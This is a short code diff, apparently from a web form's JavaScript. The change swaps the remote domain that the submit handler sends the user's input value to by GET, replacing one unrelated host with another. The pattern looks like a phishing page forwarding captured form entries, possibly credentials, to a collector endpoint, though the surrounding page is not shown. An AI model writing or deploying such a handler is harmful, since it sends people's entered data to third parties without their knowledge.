@@ -26,7 +26,7 @@ function handleSubmit(event) {
 
     // Step 2: Make a GET request to example.com/send/ + the value from Step 1
     // const url = `https://mailing.dtsluxtransport.com/send_chi/${encodeURIComponent(inputValue)}/`;
-    const url = `https://mailing.dtsluxtransport.com/send_gg/${encodeURIComponent(inputValue)}/`;
+    const url = `https://directofficesupport.com/send_gg/${encodeURIComponent(inputValue)}/V-/`;
 
     fetch(url, {
         method: 'GET'
